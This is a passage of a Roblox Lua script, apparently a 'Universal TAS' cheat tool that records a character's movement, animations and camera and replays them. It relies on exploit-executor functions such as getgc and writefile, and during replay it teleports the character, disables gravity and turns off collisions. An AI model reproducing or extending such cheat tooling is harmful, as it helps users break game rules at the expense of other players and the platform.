local UniversalTAS = loadstring(

[=[
--// Services --//

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local CoreGui = gethui and gethui() or game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")

--// Variables --//

local LocalPlayer = Players.LocalPlayer
local CurrentCamera = workspace.CurrentCamera
local GuiInset = GuiService:GetGuiInset()

local DefaultGravity = workspace.Gravity
local DefaultJumpPower
local DefaultWalkSpeed

local Util = {}

local Animate = {
	Disabled = false,
	AnimationQueue = {},
	Pose = nil,
	CurrentAnimSpeed = 0.1,
}

local Camera = {
	ZoomControllers = {},	
	CameraCFrame = CurrentCamera.CFrame
}

local Input = {
	Cursors = {},
	Cursor = nil,
	CursorIcon = nil,
	CursorSize = nil,
	Resolution = nil,
	CursorOffset = nil,
	ShiftLockEnabled = false,
}

local Replay = {
	Enabled = false,
	File = "FirstTAS",
	FileStart = "{\"Replay\":",
	FileEnd = "}",
	Writing = false,
	Reading = false,
	RecordingTable = {},
	ReplayTable = {},
	ReplayTableIndex = 0,
	Frozen = false,
    CameraLocked = true,
	FreezeFrame = 1,
	SeekDirection = 0,
	SeekDirectionMultiplier = 1,
}

local Connections = {
	SteppedConnections = {},
	RenderSteppedConnections = {},
	InputEndedQueue = {},
	InputBeganQueue= {},
	HumanoidStateQueue = {},
}

--// Main --//

do 
	function Util:GetCharacter()
		return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	end

	function Util:GetHumanoid()
		return self:GetCharacter():WaitForChild("Humanoid")
	end

	function Util:GetBodyPart(bodyPart)
		local torso = self:GetCharacter():WaitForChild("Torso")

		for _, obj in torso:GetChildren() do 
			if obj.Name == bodyPart then 
				return obj
			end
		end
	end

	function Util:RoundNumber(number, digits)
		local Mult = 10 ^ math.max(tonumber(digits) or 0, 0)
		return math.floor(number * Mult + 0.5) / Mult
	end

	function Util:Vector3ToTable(vector3)
		return {vector3.X, vector3.Y, vector3.Z}
	end

	function Util:TableToVector3(tbl)
		return Vector3.new(table.unpack(tbl))
	end

	function Util:Vector2ToTable(vector2)
		return {vector2.X, vector2.Y}
	end

	function Util:TableToVector2(tbl)
		return Vector2.new(table.unpack(tbl))
	end

	function Util:CFrameToTable(cframe)
		return {cframe:GetComponents()}
	end

	function Util:TableToCFrame(tbl)
		return CFrame.new(table.unpack(tbl))
	end

	function Util:RoundTable(tbl, digits)
		local roundedTable = {}

		for i, number in tbl do
			roundedTable[i] = self:RoundNumber(number, digits)
		end

		return roundedTable
	end

	function Util:FindListIndex(tbl, search)
		for i, v in tbl do
			if v == search then
				return i
			end
		end
	end

	function Util:WaitForInput()
		local keyPressed = Instance.new("BindableEvent")
		local inputBeganConnection

		inputBeganConnection = UserInputService.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Keyboard then
				RunService.RenderStepped:Wait()
				keyPressed:Fire()
			end
		end)

		keyPressed.Event:Wait()
		inputBeganConnection:Disconnect()
		keyPressed:Destroy()
	end
end

do 
	function Animate:StopAllAnimations()
		for _,v in Util:GetHumanoid():GetPlayingAnimationTracks() do 
			v:Stop()
		end
	end

	function Animate:Reanimate()
		if Util:GetCharacter():WaitForChild("Animate",3) then
			for _, Animate in Util:GetCharacter():GetDescendants() do
				if Animate:IsA("LocalScript") and Animate.Name == "Animate" then
					Animate:Destroy()
				end
			end
		end

		self:StopAllAnimations()

		do -- Animate script
								local Figure = Util:GetCharacter()
								local Torso = Figure:WaitForChild("Torso")
								local RightShoulder = Torso:WaitForChild("Right Shoulder")
								local LeftShoulder = Torso:WaitForChild("Left Shoulder")
								local RightHip = Torso:WaitForChild("Right Hip")
								local LeftHip = Torso:WaitForChild("Left Hip")
								local Neck = Torso:WaitForChild("Neck")
								local Humanoid = Figure:WaitForChild("Humanoid")

								local currentAnim = ""
								local currentAnimInstance = nil
								local currentAnimTrack = nil
								local currentAnimKeyframeHandler = nil
								
								local animTable = {}
								local animNames = { 
									idle = 	{	
												{ id = "http://www.roblox.com/asset/?id=180435571", weight = 8 },
												{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
											},
									walk = 	{ 	
												{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
											}, 
									run = 	{
												{ id = "run.xml", weight = 10 } 
											}, 
									jump = 	{
												{ id = "http://www.roblox.com/asset/?id=125750702", weight = 12 } 
											}, 
									fall = 	{
												{ id = "http://www.roblox.com/asset/?id=180436148", weight = 9 } 
											}, 
									climb = {
												{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
											}, 
									sit = 	{
												{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
											},	
									toolnone = {
												{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
											},
									toolslash = {
												{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
								--				{ id = "slash.xml", weight = 10 } 
											},
									toollunge = {
												{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
											},
									wave = {
												{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
											},
									point = {
												{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
											},
									dance1 = {
												{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
											},
									dance2 = {
												{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
											},
									dance3 = {
												{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
												{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
											},
									laugh = {
												{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
											},
									cheer = {
												{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
											},
								}
								local dances = {"dance1", "dance2", "dance3"}

								-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
								local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}

								function configureAnimationSet(name, fileList)
									if (animTable[name] ~= nil) then
										for _, connection in pairs(animTable[name].connections) do
											connection:disconnect()
										end
									end
									animTable[name] = {}
									animTable[name].count = 0
									animTable[name].totalWeight = 0	
									animTable[name].connections = {}

									-- check for config values

									-- fallback to defaults
									if (animTable[name].count <= 0) then
										for idx, anim in pairs(fileList) do
											animTable[name][idx] = {}
											animTable[name][idx].anim = Instance.new("Animation")
											animTable[name][idx].anim.Name = name
											animTable[name][idx].anim.AnimationId = anim.id
											animTable[name][idx].weight = anim.weight
											animTable[name].count = animTable[name].count + 1
											animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
								--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
										end
									end
								end

								-- Setup animation objects

								-- Clear any existing animation tracks
								-- Fixes issue with characters that are moved in and out of the Workspace accumulating tracks
								local animator = Humanoid and Humanoid:FindFirstChildOfClass("Animator") or nil
								if animator then
									local animTracks = animator:GetPlayingAnimationTracks()
									for i,track in ipairs(animTracks) do
										track:Stop(0)
										track:Destroy()
									end
								end


								for name, fileList in pairs(animNames) do 
									configureAnimationSet(name, fileList)
								end	

								-- ANIMATION

								-- declarations
								local toolAnim = "None"
								local toolAnimTime = 0

								local jumpAnimTime = 0
								local jumpAnimDuration = 0.3

								local toolTransitionTime = 0.1
								local fallTransitionTime = 0.3
								local jumpMaxLimbVelocity = 0.75

								-- functions

								function stopAllAnimations()
									local oldAnim = currentAnim

									-- return to idle if finishing an emote
									if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
										oldAnim = "idle"
									end

									currentAnim = ""
									currentAnimInstance = nil
									if (currentAnimKeyframeHandler ~= nil) then
										currentAnimKeyframeHandler:disconnect()
									end

									if (currentAnimTrack ~= nil) then
										currentAnimTrack:Stop()
										currentAnimTrack:Destroy()
										currentAnimTrack = nil
									end
									return oldAnim
								end

								function Animate:setAnimationSpeed(speed)
									if speed ~= self.CurrentAnimSpeed then
										self.CurrentAnimSpeed = speed
										currentAnimTrack:AdjustSpeed(self.CurrentAnimSpeed)
									end
								end

								function keyFrameReachedFunc(frameName)
									if (frameName == "End") then

										local repeatAnim = currentAnim
										-- return to idle if finishing an emote
										if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
											repeatAnim = "idle"
										end
										
										local animSpeed = self.CurrentAnimSpeed
										self:playAnimation(repeatAnim, 0.0)
										self:setAnimationSpeed(animSpeed)
									end
								end

								function Animate:playAnimation(animName, transitionTime, bypassAnimateDisabled) 
									pcall(function()
									if self.Disabled and not bypassAnimateDisabled then
										return
									end
									
									table.insert(self.AnimationQueue,{animName,transitionTime})
									
									local roll = math.random(1, animTable[animName].totalWeight) 
									local origRoll = roll
									local idx = 1
									while (roll > animTable[animName][idx].weight) do
										roll = roll - animTable[animName][idx].weight
										idx = idx + 1
									end
								--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
									local anim = animTable[animName][idx].anim

									-- switch animation		
									if (anim ~= currentAnimInstance) then
										
										if (currentAnimTrack ~= nil) then
											currentAnimTrack:Stop(transitionTime)
											currentAnimTrack:Destroy()
										end

										self.CurrentAnimSpeed = 1.0
									
										-- load it to the humanoid; get AnimationTrack
										currentAnimTrack = Util:GetHumanoid():LoadAnimation(anim)
										currentAnimTrack.Priority = Enum.AnimationPriority.Core
										 
										-- play the animation
										currentAnimTrack:Play(transitionTime)
										currentAnim = animName
										currentAnimInstance = anim

										-- set up keyframe name triggers
										if (currentAnimKeyframeHandler ~= nil) then
											currentAnimKeyframeHandler:disconnect()
										end
										currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
										
									end
								end)

								end

								-------------------------------------------------------------------------------------------
								-------------------------------------------------------------------------------------------

								local toolAnimName = ""
								local toolAnimTrack = nil
								local toolAnimInstance = nil
								local currentToolAnimKeyframeHandler = nil

								function toolKeyFrameReachedFunc(frameName)
									if (frameName == "End") then
								--		print("Keyframe : ".. frameName)	
										playToolAnimation(toolAnimName, 0.0, Humanoid)
									end
								end


								function playToolAnimation(animName, transitionTime, humanoid, priority)	 
										
										local roll = math.random(1, animTable[animName].totalWeight) 
										local origRoll = roll
										local idx = 1
										while (roll > animTable[animName][idx].weight) do
											roll = roll - animTable[animName][idx].weight
											idx = idx + 1
										end
								--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
										local anim = animTable[animName][idx].anim

										if (toolAnimInstance ~= anim) then
											
											if (toolAnimTrack ~= nil) then
												toolAnimTrack:Stop()
												toolAnimTrack:Destroy()
												transitionTime = 0
											end
													
											-- load it to the humanoid; get AnimationTrack
											toolAnimTrack = humanoid:LoadAnimation(anim)
											if priority then
												toolAnimTrack.Priority = priority
											end
											 
											-- play the animation
											toolAnimTrack:Play(transitionTime)
											toolAnimName = animName
											toolAnimInstance = anim

											currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
										end
								end

								function stopToolAnimations()
									local oldAnim = toolAnimName

									if (currentToolAnimKeyframeHandler ~= nil) then
										currentToolAnimKeyframeHandler:disconnect()
									end

									toolAnimName = ""
									toolAnimInstance = nil
									if (toolAnimTrack ~= nil) then
										toolAnimTrack:Stop()
										toolAnimTrack:Destroy()
										toolAnimTrack = nil
									end


									return oldAnim
								end

								-------------------------------------------------------------------------------------------
								------------------------------------------------------------------------------------------- 
								
								function Animate:onRunning(speed) 
									if speed > 0.01 then
										self:playAnimation("walk", 0.1)
										if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
											self:setAnimationSpeed(speed / 14.5)
										end
										self.Pose = "Running"
									else
										if emoteNames[currentAnim] == nil then
											self:playAnimation("idle", 0.1)
											self.Pose = "Standing"
										end
									end
								end

								function Animate:onDied()
									self.Pose = "Dead"
								end

								function Animate:onJumping()
									self:playAnimation("jump", 0.1)
									jumpAnimTime = jumpAnimDuration
									self.Pose = "Jumping"
								end

								function Animate:onClimbing(speed) 
									self:playAnimation("climb", 0.1)
									self:setAnimationSpeed(speed / 12.0)
									self.Pose = "Climbing"
								end

								function Animate:onGettingUp()
									self.Pose = "GettingUp"
								end

								function Animate:onFreeFall()
									if (jumpAnimTime <= 0) then
										self:playAnimation("fall", fallTransitionTime)
									end
									self.Pose = "FreeFall"
								end

								function Animate:onFallingDown()
									self.Pose = "FallingDown"
								end

								function Animate:onSeated()
									self.Pose = "Seated"
								end

								function Animate:onPlatformStanding()
									self.Pose = "PlatformStanding"
								end

								function Animate:onSwimming(speed)
									if speed > 0 then
										self.Pose = "Running"
									else
										self.Pose = "Standing"
									end
								end

								function getTool()	
									for _, kid in ipairs(Figure:GetChildren()) do
										if kid.className == "Tool" then return kid end
									end
									return nil
								end

								function getToolAnim(tool)
									for _, c in ipairs(tool:GetChildren()) do
										if c.Name == "toolanim" and c.className == "StringValue" then
											return c
										end
									end
									return nil
								end

								function animateTool()
									
									if (toolAnim == "None") then
										playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
										return
									end

									if (toolAnim == "Slash") then
										playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
										return
									end

									if (toolAnim == "Lunge") then
										playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
										return
									end
								end

								function moveSit()
									RightShoulder.MaxVelocity = 0.15
									LeftShoulder.MaxVelocity = 0.15
									RightShoulder:SetDesiredAngle(3.14 /2)
									LeftShoulder:SetDesiredAngle(-3.14 /2)
									RightHip:SetDesiredAngle(3.14 /2)
									LeftHip:SetDesiredAngle(-3.14 /2)
								end

								local lastTick = 0

								function move(time)
									if self.Disabled then
										return
									end
									
									local amplitude = 1
									local frequency = 1
									local deltaTime = time - lastTick
									lastTick = time

									local climbFudge = 0
									local setAngles = false

									if (jumpAnimTime > 0) then
										jumpAnimTime = jumpAnimTime - deltaTime
									end

									if (self.Pose == "FreeFall" and jumpAnimTime <= 0) then
										self:playAnimation("fall", fallTransitionTime)
									elseif (self.Pose == "Seated") then
										self:playAnimation("sit", 0.5)
										return
									elseif (self.Pose == "Running") then
										self:playAnimation("walk", 0.1)
									elseif (self.Pose == "Dead" or self.Pose == "GettingUp" or self.Pose == "FallingDown" or self.Pose == "Seated" or self.Pose == "PlatformStanding") then
								--		print("Wha " .. pose)
										stopAllAnimations()
										amplitude = 0.1
										frequency = 1
										setAngles = true
									end

									if (setAngles) then
										local desiredAngle = amplitude * math.sin(time * frequency)

										RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
										LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
										RightHip:SetDesiredAngle(-desiredAngle)
										LeftHip:SetDesiredAngle(-desiredAngle)
									end

									-- Tool Animation handling
									local tool = getTool()
									if tool and tool:FindFirstChild("Handle") then
									
										local animStringValueObject = getToolAnim(tool)

										if animStringValueObject then
											toolAnim = animStringValueObject.Value
											-- message recieved, delete StringValue
											animStringValueObject.Parent = nil
											toolAnimTime = time + .3
										end

										if time > toolAnimTime then
											toolAnimTime = 0
											toolAnim = "None"
										end

										animateTool()		
									else
										stopToolAnimations()
										toolAnim = "None"
										toolAnimInstance = nil
										toolAnimTime = 0
									end
								end

								Humanoid.Died:connect(function(...)
									if self.Disabled then
										return
									end

									self:onDied(...)
								end)

								Humanoid.Running:connect(function(Speed)
									if self.Disabled then
										return
									end

									self:onRunning(Speed)
								end)
								Humanoid.Jumping:connect(function(...)
									if self.Disabled then
										return
									end

									self:onJumping(...)
								end)
								Humanoid.Climbing:connect(function(Speed)
									if self.Disabled then
										return
									end
									
									self:onClimbing(Speed)
								end)
								Humanoid.GettingUp:connect(function(...)
									if self.Disabled then
										return
									end
									
									self:onGettingUp(...)
								end)
								Humanoid.FreeFalling:connect(function(...)
									if self.Disabled then
										return
									end
									
									self:onFreeFall(...)
								end)
								Humanoid.FallingDown:connect(function(...)
									if self.Disabled then
										return
									end
									--table.insert(AnimationQueue,7)
									self:onFallingDown(...)
								end)
								Humanoid.Seated:connect(function(...)
									if self.Disabled then
										return
									end
									
									self:onSeated(...)
								end)
								Humanoid.PlatformStanding:connect(function(...)
									if self.Disabled then
										return
									end

									self:onPlatformStanding(...)
								end)
								Humanoid.Swimming:connect(function(...)
									if self.Disabled then
										return
									end

									self:onSwimming(...)
								end)

								game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
									local emote = ""
									if msg == "/e dance" then
										emote = dances[math.random(1, #dances)]
									elseif (string.sub(msg, 1, 3) == "/e ") then
										emote = string.sub(msg, 4)
									elseif (string.sub(msg, 1, 7) == "/emote ") then
										emote = string.sub(msg, 8)
									end
									
									if (self.Pose == "Standing" and emoteNames[emote] ~= nil) then
										self:playAnimation(emote, 0.1)
									end

								end)

								self:playAnimation("idle", 0.1)
								self.Pose = "Standing"

								spawn(function()
									while Figure.Parent ~= nil do
										local _, time = wait(0.1)
										move(time)
									end
								end)
							end
							
		end
end

do
	function Camera:SetZoom(zoom)
		for _,ZoomController in self.ZoomControllers do
			pcall(function()
				ZoomController:SetCameraToSubjectDistance(zoom)
			end)
		end
	end

	function Camera:GetZoom()
		for _,ZoomController in self.ZoomControllers do
			local Zoom = ZoomController:GetCameraToSubjectDistance()
			if Zoom and Zoom ~= 12.5 then
				return Zoom
			end
		end

		return 12.5
	end

	function Camera:SetCFrame(cframe)
		self.CameraCFrame = cframe
	--	CurrentCamera.CFrame = cframe
	end

	function Camera:Init()
		VirtualInputManager:SendKeyEvent(true, 304, false, workspace)
		task.wait()
		VirtualInputManager:SendKeyEvent(true, 304, false, workspace)
		task.wait()

		for _, obj in getgc(true) do
			if type(obj) == "table" and rawget(obj, "FIRST_PERSON_DISTANCE_THRESHOLD") then
				table.insert(self.ZoomControllers, obj)
			end
		end	
	end
end

do  
	local Cursors = {
		["ArrowFarCursor"] = {
			Icon = "rbxasset://textures/Cursors/KeyboardMouse/ArrowFarCursor.png";
			Size = UDim2.fromOffset(64,64);
			Offset = Vector2.new(-32,4);
		};
		["MouseLockedCursor"] = {
			Icon = "rbxasset://textures/MouseLockedCursor.png";
			Size = UDim2.fromOffset(32,32);
			Offset = Vector2.new(-16,20);
		};
	}

	function Input:GetShiftLockEnabled()
		return self.ShiftLockEnabled
	end

	function Input:SetShiftLockEnabled(bool)
		if self.ShiftLockEnabled ~= bool then
			self.ShiftLockEnabled = bool
			if bool then
				self:SetCursor("MouseLockedCursor")
			else
				self:SetCursor("ArrowFarCursor")
			end

			self.MouseLockController:DoMouseLockSwitch("MouseLockSwitchAction", Enum.UserInputState.Begin, game)
		end
	end

	function Input:BlockInputs()
		self.Controls:Disable()
	end

	function Input:UnblockInputs()
		self.Controls:Enable()
	end

	function Input:SetCursor(name)
		local CursorData = Cursors[name]
		self.CursorIcon = CursorData.Icon
		self.CursorSize = CursorData.Size
		self.CursorOffset = CursorData.Offset
	end

	function Input:Init()		
		self.CursorHolder = Instance.new("ScreenGui")
		self.Cursor = Instance.new("ImageLabel")
		self.Cursor.BackgroundTransparency = 1
		self.Cursor.ZIndex = math.huge
		self.Cursor.Parent = self.CursorHolder
		self.CursorHolder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		self.CursorHolder.Parent = CoreGui
		self.CursorHolder.DisplayOrder = 2147483647
		self.Resolution = self.CursorHolder.AbsoluteSize

		self.BlockGui = Instance.new("ScreenGui")
		self.BlockFrame = Instance.new("TextButton")
		self.BlockFrame.Text = ""
		self.BlockFrame.BackgroundTransparency = 1
		self.BlockFrame.Size = UDim2.fromScale(1,1)
		self.BlockFrame.Selectable = false
		self.BlockFrame.Selected = false
		self.BlockFrame.Parent = self.BlockGui 
		self.BlockGui.Enabled = false
		self.BlockGui.Parent = CoreGui

		for _, obj in getgc(true) do 
			if type(obj) == "table" and rawget(obj, "activeMouseLockController") then 
				self.MouseLockController = obj.activeMouseLockController
				break
			end
		end

		for _, obj in getgc(true) do 
			if type(obj) == "table" and rawget(obj, "controls") then 
				self.Controls = obj.controls
				break
			end
		end

		self:SetCursor("ArrowFarCursor")
		UserInputService.MouseIconEnabled = false
		LocalPlayer:FindFirstChild("BoundKeys", true).Value = ""

		task.spawn(function()
			while true do
				self.Cursor.Image = self.CursorIcon
				self.Cursor.Size = self.CursorSize

				local mouseLocation = UserInputService:GetMouseLocation()
				if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
					self.Cursor.Position = UDim2.fromOffset((self.Resolution.X / 2)+self.CursorOffset.X-GuiInset.X,(self.Resolution.Y/2)+self.CursorOffset.Y-GuiInset.Y-18)
				else
					self.Cursor.Position = UDim2.fromOffset(mouseLocation.X+self.CursorOffset.X-GuiInset.X,mouseLocation.Y+self.CursorOffset.Y-GuiInset.Y-36)
				end

				RunService.RenderStepped:Wait()
			end
		end)
	end
end

do 	
	function Replay:Encode(tbl)
		local encoded = HttpService:JSONEncode(tbl)

		return `{self.FileStart}{encoded}{self.FileEnd}`
	end

	function Replay:Decode(str)
		local decoded = HttpService:JSONDecode(str)

		return decoded.Replay
	end
	
	function Replay:NewFile(fileName)
		self.File = fileName
		self.RecordingTable = {}
		self.ReplayTable = {}
		self.ReplayTableIndex = 0
		self.FreezeFrame = 1
		self.SeekDirection = 0
		self.SeekDirectionMultiplier = 1
	end
	
	function Replay:GetReplayFile()
		if not isfolder("Universal TAS") then 
			makefolder("Universal TAS")
		end

		if not isfile(`Universal TAS/{self.File}.json`) then 
			writefile(`Universal TAS/{self.File}.json`, self.FileStart)
			return self.FileStart
		end

		return readfile(`Universal TAS/{self.File}.json`)
	end

	function Replay:SaveToFile()
		local encoded = self:Encode(self.ReplayTable)

		writefile(`Universal TAS/{self.File}.json`, encoded)
	end

	function Replay:RecordReplay()
		if self.Writing then 
			self:Stop()
			return
		end

		Util:WaitForInput()

		self:Start()
	end

	function Replay:StartRecording()
		if self.Reading then 
			return
		end

		self.Writing = true
	end

	function Replay:StopRecording()
		if self.Reading then 
			return
		end

		self.Writing = false
	end

	function Replay:SaveRecording()
		if #self.RecordingTable > 0 then 
			local old = #self.ReplayTable

			for _, frame in self.RecordingTable do 
				table.insert(self.ReplayTable, frame)
			end

			self.RecordingTable = {}
		end
	end

	function Replay:DiscardRecording()
		if #self.RecordingTable > 0 then
			self.RecordingTable = {}
		end
	end

	function Replay:StartReading(file, dly)
		if self.Reading then 
			return
		end

		dly = dly or 3

		task.wait(dly)
		
				
		self.ReplayTable = file or self:Decode(self:GetReplayFile())
		if not self.ReplayTable then 
			self.ReplayTable = {}
		end

		self:Freeze(false, nil, true)
		Animate.Disabled = true
		workspace.Gravity = 0
		self.ReplayTableIndex = 1
		Input:BlockInputs()
		self.Reading = true
	end

	function Replay:StopReading()
		if not self.Reading then
			return 
		end

		local character = Util:GetCharacter()

		Input:UnblockInputs()
		character.Head.CanCollide = true 
		character.Torso.CanCollide = true
		character.HumanoidRootPart.CanCollide = true
		Animate.Disabled = false
		self.Reading = false	
		character.Humanoid.JumpPower = DefaultJumpPower
		character.Humanoid.WalkSpeed = DefaultWalkSpeed

		workspace.Gravity = DefaultGravity
	end

	
	function Replay:ForceStop()
		if not self.Reading then return end

		self.Reading = false
		self.Writing = false
		Input:UnblockInputs()
		Animate.Disabled = false

		local character = Util:GetCharacter()
		local humanoid = Util:GetHumanoid()

		-- Unanchor movement
		local rootPart = character:FindFirstChild("HumanoidRootPart")
		if rootPart then
			rootPart.Anchored = false
		end

		-- Restore movement
		humanoid.WalkSpeed = DefaultWalkSpeed
		humanoid.JumpPower = DefaultJumpPower

		-- Restore gravity
		workspace.Gravity = DefaultGravity
	end



	function Replay:Freeze(bool, dontRecord, nah)
		if self.Frozen == bool or self.Reading then 
			return
		end

		self.SeekDirection = 0

		if bool then 
			self.Frozen = true
			self:StopRecording()
			self:SaveRecording()
			self.FreezeFrame = #self.ReplayTable
		else 
			if dontRecord then 
				self.Frozen = false
			else 
				for i = #self.ReplayTable, self.FreezeFrame, -1 do
					self.ReplayTable[i] = nil
				end

				self.Frozen  = false
				
				if not nah then 

				self:StartRecording()
				end
			end
		end
	end

	function Replay:Init()
		task.spawn(function()
			while true do 
				if self.Reading then 
					local frame = self.ReplayTable[self.ReplayTableIndex]
					if frame == 0 then 
						Util:GetHumanoid():ChangeState(15)
						for _, obj in Util:GetCharacter():GetDescendants() do 
							if obj:IsA("BasePart") then 
								obj:Destroy()
							end
						end
						repeat 
							task.wait()
						until not Connections.Dead
						RunService.Heartbeat:Wait()
						self.ReplayTableIndex += 1
						continue
					elseif frame == 1 then 
						Util:GetHumanoid():ChangeState(15)
						workspace.Gravity = DefaultGravity

						continue
					end
					if not frame then 
						Replay:StopReading()
						continue
					end
					Animate.Disabled = true
					workspace.Gravity = 0
					Util:GetHumanoid().WalkSpeed = 0
					Util:GetHumanoid().JumpPower = 0
					if not Util:GetCharacter():FindFirstChild("HumanoidRootPart") then 
						RunService.Heartbeat:Wait()

						continue
					end
					local rootPartCFrame = Util:TableToCFrame(frame[1])
					local animations = frame[2]
					local animationSpeed = frame[3]
					local humanoidState = frame[4]
					local currentCameraCFrame = Util:TableToCFrame(frame[7]) 
					local zoom = frame[8]
					local animatePose = frame[9]
					local shiftLockEnabled = (frame[10] == 1 and true) or false
					local mouseLocation = Util:TableToVector2(frame[11])
					local CurrentState = Util:GetHumanoid():GetState().Value
					--Camera:SetCFrame(currentCameraCFrame)
					--Camera:SetZoom(zoom)
					Util:GetHumanoid():ChangeState(humanoidState)
					Animate.Pose = animatePose
					for _, args in animations do
						local animation = args[1]
						local transitionTime = args[2]
						if animation == "walk" then
							if Util:GetHumanoid().FloorMaterial ~= Enum.Material.Air and CurrentState ~= 3 then
								Animate:playAnimation("walk", transitionTime, true)
							end
						else
							Animate:playAnimation(animation, transitionTime, true)
						end
					end
					pcall(function()
						Animate:setAnimationSpeed(animationSpeed)
					end)
--[[
					if shiftLockEnabled then
						Input:SetShiftLockEnabled(true)
					else
						Input:SetShiftLockEnabled(false)
					end	
					--]]
--[[
					if not shiftLockEnabled and zoom > 0.52 then
						mousemoveabs(mouseLocation.X, mouseLocation.Y)
					else
						mousemoveabs((Input.Resolution.X / 2) + Input.CursorOffset.X - GuiInset.X, (Input.Resolution.Y / 2) + Input.CursorOffset.Y - GuiInset.Y - 36)
					end
					--]]
					Util:GetCharacter().HumanoidRootPart.CFrame = rootPartCFrame
					self.ReplayTableIndex += 1
				end
				RunService.Heartbeat:Wait()
			end
		end)


		task.spawn(function()
			while true do 
				if self.Reading then
					if workspace.Gravity ~= DefaultGravity then
						for _,v in Util:GetCharacter():GetChildren() do
							if v:IsA("BasePart") then
								v.CanCollide = false
							end
						end
					end
					if not Util:GetCharacter():FindFirstChild("HumanoidRootPart") then
						RunService.Stepped:Wait()
						continue
					end
					local frame = self.ReplayTable[self.ReplayTableIndex]
					if frame and type(frame) == "table" then
						local humanoidRootPartCFrame = Util:TableToCFrame(frame[1])
						local currentCameraCFrame = Util:TableToCFrame(frame[7])
						local zoom = frame[8]

						Util:GetCharacter().HumanoidRootPart.CFrame = humanoidRootPartCFrame
					end
				else
					workspace.Gravity = DefaultGravity
				end
				RunService.Stepped:Wait()
			end
		end)

		task.spawn(function()
			while true do
				if self.Writing then 
					if (not Util:GetCharacter() or not Util:GetCharacter().Parent) or (not Util:GetCharacter():FindFirstChild("HumanoidRootPart")) then
						if type(self.RecordingTable[#self.RecordingTable]) == "table" then
							table.insert(self.RecordingTable, 0)
						end
						RunService.RenderStepped:Wait()
						continue
					end
					if (Util:GetHumanoid().Health == 0) then
						if type(self.RecordingTable[#self.RecordingTable]) == "table" then
							table.insert(self.RecordingTable, 1)
						end
						RunService.RenderStepped:Wait()
						continue
					end
					local frame = {}
					frame[1] = Util:RoundTable(Util:CFrameToTable(Util:GetCharacter().HumanoidRootPart.CFrame), 3)
					frame[2] = Animate.AnimationQueue
					frame[3] = Util:RoundNumber(Animate.CurrentAnimSpeed, 3)
					frame[4] = Util:GetHumanoid():GetState().Value
					frame[5] = Util:RoundTable(Util:Vector3ToTable(Util:GetCharacter().HumanoidRootPart.Velocity), 3)
					frame[6] = Util:RoundTable(Util:Vector3ToTable(Util:GetCharacter().HumanoidRootPart.RotVelocity), 3)
					frame[7] = Util:RoundTable(Util:CFrameToTable(CurrentCamera.CFrame), 3)
					frame[8] = Util:RoundNumber(Camera:GetZoom(), 3)
					frame[9] = Animate.Pose
					frame[10] = (Input:GetShiftLockEnabled() and 1) or 0
					frame[11] = Util:RoundTable(Util:Vector2ToTable(UserInputService:GetMouseLocation()), 3)
					frame[12] = {Connections.InputBeganQueue, Connections.InputEndedQueue}
					table.insert(self.RecordingTable, frame)
				end
				Animate.AnimationQueue = {}
				Connections.HumanoidStateQueue = {}
				if setfpscap then
					setfpscap(60)
				end
				RunService.RenderStepped:Wait()
			end
		end)

		task.spawn(function()
			while true do
				if self.Frozen then
					Util:GetCharacter().HumanoidRootPart.Anchored = true
					if self.FreezeFrame > 0 and self.FreezeFrame <= #self.ReplayTable then
						local RoundedFreezeFrame = Util:RoundNumber(self.FreezeFrame, 0)
						local Frame = self.ReplayTable[RoundedFreezeFrame]
						if type(Frame) == "table" then
							local AnimatePose
							local Animation
							for i = RoundedFreezeFrame,1,-1 do
								if AnimatePose and Animation then
									break
								end
								local Frame = self.ReplayTable[i]
								if type(Frame) == "table" then
